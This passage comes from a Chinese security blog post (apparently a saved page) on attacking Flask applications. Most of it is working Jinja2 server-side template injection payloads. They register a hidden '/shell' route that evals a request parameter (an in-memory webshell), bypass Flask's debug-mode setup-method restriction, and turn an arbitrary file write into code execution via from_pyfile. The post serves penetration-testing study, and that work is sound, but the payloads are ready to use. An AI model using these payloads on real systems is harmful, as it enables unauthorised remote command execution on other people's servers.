+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6774680b-6b51-4b8d-af80-5c1e75ae8773.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+而 <code>site-packages/flask/app.py</code> 中的 <code>class Flask</code> 继承了 <code>Scaffold</code> 且定义了 <code>_is_setup_finished</code>：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/5a6525b8-5f8f-41f5-870b-c7ba27aad4dc.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+这就说明，当开启 debug 模式，且已经开始准备好开始处理客户端的请求，就没办法在执行 setup function 了。如果你想知道还有哪些算 setup function，在 <code>site-packages/flask/app.py</code> 中被装饰器 <code>@setupmethod</code> 装饰的都算。当然，由于这里是通过装饰器做的限制，所以理论上我们精简 setup function 之后或许也可以自己搞出与之等价的函数，这一点后面会举例。</li>
+</ol>
+<p>踩完坑之后，下面结合 jinja2 的 SSTI 举几个例子。</p>
+<p>由于 jinja2 中并不支持用 <code>lambda</code>（通过 mro 引入也不行用，因为 jinja 的语法本身就不支持），而 <code>view_func</code> 参数又必须是一个 func，如果直接使用 <code>view_func=eval</code>，由于在 flask 不会给 <code>view_func</code> 传参，所以压根就没法执行。如果是固定执行一个命令倒是可以，就是有点不够灵活了。</p>
+<p>为了实现类似 lambda 的效果，我们可以定义一个宏，然后植入后门：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; cycler.__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p>
+<p>这里有坑需要注意下。</p>
+<p>我在测试的过程中发现，<code>lipsum. ... .__import__("__main__").app.add_url_rule</code> 似乎会改变 <code>lipsum</code> 的上下文属性，导致在宏里无法引用到 <code>lipsum</code>。也就是说，这个 payload 是不行的：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p>
+<p>以及由于 <code>macro</code> 和普通函数不太一样，它是没有 <code>__name__</code> 的。所以必须指定一下 endpoint。</p>
+<p>除了宏之外，还有办法搞一个自定义函数出来吗？如果可以使用 <code>def</code> 就好了。那么这个 <code>exec</code> 就可以实现。虽然 exec 返回值固定是 None，但是其实里面定义的函数在外边是可以使用的（<strong>通常情况</strong>）：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/ae46efd6-2569-4a79-8fa1-8ec65a4eb3ee.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>上面特别标注了 “通常情况”，为何呢？<code>eval</code>、<code>exec</code>、<code>compile</code> 都是非常有趣的内置函数，他们有非常多的特性，有机会我专门写一篇来介绍。</p>
+<p>总之，我们可以这样：<code>eval('exec("def x(): return x")')</code></p>
+<p>当然，<code>compile</code> 也是 ok 的，所以还可以这样：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).FunctionType(<br>  <span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">&#x27;def foo(): return &quot;bar&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span><br>  ).co_consts[<span class="hljs-number">0</span>],<br>  <span class="hljs-built_in">globals</span>()<br>)<br></code></pre></td></tr></table></figure>
+<p>结合 jinja2 的 SSTI 就是这样了：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br></code></pre></td></tr></table></figure></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;__import__(&quot;types&quot;).FunctionType(compile(</span><br><span class="hljs-string">      &quot;def x(): &quot;</span><br><span class="hljs-string">        &quot;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&quot;, </span><br><span class="hljs-string">      &quot;&quot;,</span><br><span class="hljs-string">      &quot;exec&quot;</span><br><span class="hljs-string">    ).co_consts[0], globals())&#x27;</span><br>  )<br>)<br></code></pre></td></tr></table></figure>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/7ba8229a-b7ad-4161-a17d-b3c10b5a37ea.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h4 id="绕过-setup-function-debug-模式限制">绕过 setup function debug 模式限制</h4>
+<p>正如上面说的那样，在 debug 模式下是没办法直接使用 setup function 的。好在有绕过的办法（下面均以 <code>add_url_rule</code> 为例）。</p>
+<blockquote>
+<p>修改属性</p>
+</blockquote>
+<p><code>_is_setup_finished</code> 中的限制，是实时获取属性来判断的。所以我们只需要修改 <code>app.deug = False</code> 或者 <code>app._got_first_request = False</code> 即可绕过。例如：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">setattr</span>(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app,<br>  <span class="hljs-string">&quot;debug&quot;</span>,<br>  <span class="hljs-literal">False</span><br>), <br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/1f62e65b-b017-4e24-a3e4-4e3c33acdc5e.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<blockquote>
+<p>模拟 setup function</p>
+</blockquote>
+<p>在 <code>site-packages/flask/app.py</code> 中可以看到 <code>add_url_rule</code> 的逻辑似乎比较复杂。但实际上，它最主要的操作就两个：</p>
+<ol type="1">
+<li><code>rule = self.url_rule_class(rule, methods=methods, **options)</code> &amp; <code>self.url_map.add(rule)</code></li>
+<li><code>self.view_functions[endpoint] = view_func</code></li>
+</ol>
+<p>所以我们只需要执行：</p>
+<ol type="1">
+<li><code>app.url_map.add(app.url_rule_class("/shell", methods=&#123;"GET"&#125;, endpoint="x"))</code>，就可以在 <code>/shell</code> 上注册一个叫 <code>x</code> 的 endpoint</li>
+<li><code>app.view_functions["x"] = eval</code>，这样就完成了 endpoint 与函数的绑定</li>
+</ol>
+<p>还是以 SSTI 为例：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.url_map.add(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app.url_rule_class(<br>    <span class="hljs-string">&quot;/shell&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>], endpoint=<span class="hljs-string">&quot;x&quot;</span><br>  )<br>),<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.view_functions.__setitem__(<br>  <span class="hljs-string">&quot;x&quot;</span>,<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>      <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>        <span class="hljs-string">&#x27;def x(): &#x27;</span><br>          <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>      <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>    )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e91f0ec0-5330-45c6-b2a6-1d0549ee38b9.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h4 id="其他-setup-function">其他 setup function</h4>
+<p>像 <code>before_request_funcs</code>、<code>after_request</code>、<code>register_error_handler</code> 之类的应该都是可以用来搞内存马的。可能还有一些其他函数，有需要用的时候可以翻翻官方文档尝试一下。</p>
+<h4 id="从文件写到-rce">从文件写到 RCE</h4>
+<p>在《Python 沙箱逃逸的经验总结》中我们提到过，如果存在文件写漏洞，则可以通过 import 或者 exec 等等完成 RCE。</p>
+<p>在 flask 的场景下，还有一个特殊的途径。</p>
+<p>在 <code>from_pyfile</code> 中，会执行 exec，且由于 exec 的特性，会把 exec 中执行生成的变量存储在 <code>d.__dict__</code>，所以 exec 中的变量均可以通过 <code>d.</code> 获取到。而最后又会调用 <code>from_object</code>，这个函数会将全大写的变量名置为 <code>self</code>（也就是 <code>flask.Flask.config</code>）的属性。</p>
+<p>关键代码如下：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e95e5f6b-26b4-4a4f-a86d-a5fbe2c3b348.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>既然如此，我们可以先在目标环境中创建一段包含 Python 代码的文件（比如任意文件上传），并在里面创建一个全大写变量名 <code>CMD = eval</code>，然后触发 <code>from_pyfile</code>（例如 SSTI），这样就可以在 config 中直接用到这个 eval：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>)<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.from_pyfile</span>(<span class="hljs-string">&quot;file.png&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>然后直接 <code>&#123;&#123;config.CMD&#125;&#125;</code> 使用即可：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4667502f-1e22-4647-9973-3f29a4211126.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>个人觉得这个也算内存马了。</p>
+<h2 id="总结">总结</h2>
+<p>flask 的攻击面还是比较广的，毕竟作为一个 Web 应用框架，能承载的功能是非常丰富的，它还有各种各样的插件。</p>
+<p>所以在考量 flask 应用的时候，flask 本身的安全性（代码/架构）、通过 flask 搭建的应用的安全性（代码/逻辑）、插件（第三方代码）都是不可或缺的一部分。所以这部分的内容一篇文章恐难以总结全，本文就先介绍到这，后面如果发现新的姿势会继续补充。</p>
+<h2 id="资料">资料</h2>
+<ol type="1">
+<li>werkzeug 文档<br />
+https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/tutorial.html</li>
+<li>flask cve<br />
+https://snyk.io/vuln/pip:flask</li>
+<li>flask-session-cookie-manager<br />
+https://github.com/noraj/flask-session-cookie-manager</li>
+<li>SecMap - SSTI（jinja2）<br />
+https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/</li>
+<li>flask 标准上下文<br />
+https://flask.palletsprojects.com/en/2.1.x/templating/#standard-context</li>
+<li>flask request 属性<br />
+https://flask.palletsprojects.com/en/2.1.x/api/#incoming-request-data</li>
+<li>dibber<br />
+https://github.com/Macr0phag3/dibber</li>
+</ol>
+</br>
+<p style="text-align: center; font-weight: bolder">
+<font size="2" color="gray">最近遇到了 Python + yaml 的反序列化问题<br>所以下一篇估计是补齐一下这部分知识点<br>一起加油 💪</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/SecMap/">#SecMap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SecMap - Flask</div>
+      <div>https://www.tr0y.wang/2022/05/16/SecMap-flask/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年3月19日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/30/xsleaks-wiki-zh_CN/" title="xsleaks wiki 中文版发布">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">xsleaks wiki 中文版发布</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/29/SecMap-SSTI-mako/" title="SecMap - SSTI（mako）">
+                        <span class="hidden-mobile">SecMap - SSTI（mako）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
